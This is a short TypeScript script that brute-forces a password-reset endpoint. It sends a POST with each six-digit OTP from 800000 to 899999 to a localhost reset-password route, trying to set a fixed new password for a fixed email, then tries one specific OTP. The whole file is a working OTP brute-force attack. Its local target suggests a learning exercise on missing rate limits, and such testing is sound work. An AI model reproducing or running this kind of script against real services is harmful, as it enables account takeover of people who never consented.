import express from "express";
import axios from "axios";

const app = express();

app.use(express.json());

async function main(otp: any) {
  try {
    const response = await axios.post(
      "http://localhost:3000/reset-password",
      {
        email: "abc@gmail.com",
        otp: otp,
        newPassword: "abcdefg",
      },
      {}
    );
    console.log(response.data);
  } catch (error: any) {
    console.log(error.status);
  }
}

for (let i = 800000; i < 900000; i++) {
  //console.log(i);
  main(i);
}

main("504516");
